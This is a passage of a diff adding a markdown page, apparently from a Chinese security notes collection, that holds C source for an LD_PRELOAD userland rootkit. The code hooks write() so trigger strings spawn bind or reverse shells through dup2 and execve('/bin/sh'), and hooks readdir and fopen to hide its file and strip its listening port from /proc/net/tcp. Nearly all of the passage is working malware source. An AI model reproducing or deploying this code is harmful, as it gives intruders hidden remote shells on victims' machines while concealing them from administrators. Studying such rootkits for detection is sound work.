+    struct sockaddr_in client;
+    client.sin_family = AF_INET;
+    client.sin_port = htons(LOC_PORT);
+    client.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
+
+    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(sockfd, count);
+    }
+
+    execve("/bin/sh", NULL, NULL);
+    close(sockfd);
+
+    return 0;
+}
+
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+
+    ssize_t result;
+
+    new_write = dlsym(RTLD_NEXT, "write");
+
+
+    char *bind4 = strstr(buf, KEY_4);
+    char *bind6 = strstr(buf, KEY_6);
+    char *rev4 = strstr(buf, KEY_R_4);
+    char *rev6 = strstr(buf, KEY_R_6);
+
+    if (bind4 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv4_bind();
+    }
+
+    else if (bind6 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv6_bind();
+    }
+
+    else if (rev4 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv4_rev();
+    }
+
+    else if (rev6 != NULL)
+    {
+        fildes = open("/dev/null", O_WRONLY | O_APPEND);
+        result = new_write(fildes, buf, nbytes);
+        ipv6_rev();
+    }
+
+    else
+    {
+        result = new_write(fildes, buf, nbytes);
+    }
+
+    return result;
+}
+
+struct dirent *(*old_readdir)(DIR *dir);
+struct dirent *readdir(DIR *dirp)
+{
+    old_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *dir;
+
+    while (dir = old_readdir(dirp))
+    {
+        if(strstr(dir->d_name,FILENAME) == 0) break;
+    }
+    return dir;
+}
+
+
+struct dirent64 *(*old_readdir64)(DIR *dir);
+struct dirent64 *readdir64(DIR *dirp)
+{
+    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+
+    struct dirent64 *dir;
+
+    while (dir = old_readdir64(dirp))
+    {
+        if(strstr(dir->d_name,FILENAME) == 0) break;
+    }
+    return dir;
+}
+
+FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+FILE *fopen64(const char *pathname, const char *mode)
+{
+	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
+
+	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp = tmpfile64();
+		fp = orig_fopen64(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, KEY_PORT);
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(line, temp);
+			}
+		}
+		return temp;
+	}
+
+	fp = orig_fopen64(pathname, mode);
+	return fp;
+}
+
+FILE *(*orig_fopen)(const char *pathname, const char *mode);
+FILE *fopen(const char *pathname, const char *mode)
+{
+	orig_fopen = dlsym(RTLD_NEXT, "fopen");
+
+	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp = tmpfile();
+		fp = orig_fopen(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, KEY_PORT);
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(line, temp);
+			}
+		}
+		return temp;
+
+	}
+
+	fp = orig_fopen(pathname, mode);
+	return fp;
+}
+```
+
+[:books: 返回目录](#目录)  
